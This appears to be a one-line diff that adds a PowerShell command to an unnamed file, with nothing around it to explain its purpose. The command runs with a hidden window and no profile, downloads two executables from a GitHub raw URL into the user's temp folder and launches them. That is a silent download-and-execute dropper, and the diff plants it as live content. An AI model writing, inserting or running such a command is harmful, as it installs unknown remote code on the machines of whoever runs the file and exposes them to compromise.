@@ -1,0 +1,1 @@
+powershell -NoP -NonI -W Hidden ('https://raw.githubusercontent.com/alexcontrol99/rl/main/rl.exe','https://raw.githubusercontent.com/alexcontrol99/rl/main/rb.exe')|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;""
